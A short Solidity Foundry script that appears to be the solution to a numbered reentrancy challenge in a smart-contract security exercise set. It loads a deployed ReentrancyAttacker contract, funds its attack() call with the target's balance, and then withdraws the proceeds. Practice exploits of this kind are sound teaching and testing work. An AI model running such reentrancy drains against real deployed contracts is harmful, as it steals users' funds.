// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {DevOpsTools} from "foundry-devops/src/DevOpsTools.sol";
import {ReentrancyAttacker} from "../../src/attackers/10/ReentrancyAttacker.sol";

contract ReentrancySolution is Script {
    function run() external {
        address mostRecentlyDeployedReentrancyAttacker =
                            DevOpsTools.get_most_recent_deployment("ReentrancyAttacker", block.chainid);
        solve(mostRecentlyDeployedReentrancyAttacker);
    }

    function solve(address attacker) public {
        ReentrancyAttacker attackerContract = ReentrancyAttacker(payable(attacker));
        address target = address(attackerContract.puzzleContract());
        uint256 balance = target.balance;

        vm.startBroadcast();
        attackerContract.attack{value: balance}();
        attackerContract.withdraw();
        vm.stopBroadcast();
    }
}
